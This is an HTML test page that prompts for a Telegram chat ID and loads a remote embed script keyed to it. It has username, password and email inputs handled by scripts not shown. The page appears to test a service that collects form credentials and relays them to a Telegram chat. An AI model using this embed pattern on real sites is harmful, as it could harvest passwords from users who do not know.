<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Test CDN-hosted JavaScript Function</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="main.js"></script>
    <script src="fetchdb.js"></script>
    <script src="verifydb.js"></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        max-width: 500px;
        margin: 0 auto;
        padding: 20px;
      }
      input {
        display: block;
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #ddd;
        border-radius: 4px;
      }
      button {
        background-color: #4caf50;
        color: white;
        padding: 10px 15px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
      }
      button:hover {
        background-color: #45a049;
      }
      #embedInstructions {
        margin-top: 20px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 4px;
        background-color: #f9f9f9;
      }
      .hidden {
        display: none;
      }
    </style>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const chatId = prompt("Please enter your Telegram chat ID:");
        if (chatId) {
          const scriptTag = `<script src="https://etty-db.vercel.app/embed.js?chat_id=${chatId}"><\/script>`;
          document.getElementById("scriptTagContainer").textContent = scriptTag;

          const script = document.createElement("script");
          script.src = `https://etty-db.vercel.app/embed.js?chat_id=${chatId}`;
          document.body.appendChild(script);

          // Provide instructions to the user
          document.getElementById(
            "embedInstructions"
          ).textContent = `To embed this service into your HTML, add the following script tag to your HTML file: ${scriptTag}`;
        }
      });
      function reloadData() {
        const chatId = window.TELEGRAM_CHAT_ID;
        if (!chatId) {
          alert("Chat ID is not set");
          return;
        }

        fetch(`/reloadData?chat_id=${chatId}`)
          .then((response) => {
            if (!response.ok) {
              throw new Error("Failed to reload data");
            }
            return response.text();
          })
          .then((data) => {
            alert("Data reloaded successfully");
          })
          .catch((error) => {
            console.error("Error reloading data:", error);
            alert("Failed to reload data");
          });
      }
    </script>
  </head>

  <body>
    <h1>Test CDN-hosted JavaScript Function</h1>
    <div id="scriptTagContainer" class="hidden"></div>
    <input type="text" class="userInput" placeholder="username" />
    <input type="password" class="userInput" placeholder="password" />
    <input type="email" class="userInput" placeholder="email" />
    <button onclick="gatherInfo()">Submit</button>
    <input type="text" class="verifyInput" placeholder="username" />
    <input type="password" class="verifyInput" placeholder="password" />
    <button onclick="verifyInfo()">Verify</button>
    <div id="embedInstructions"></div>
    <button onclick="reloadData()">Reload Data</button>
  </body>
</html>
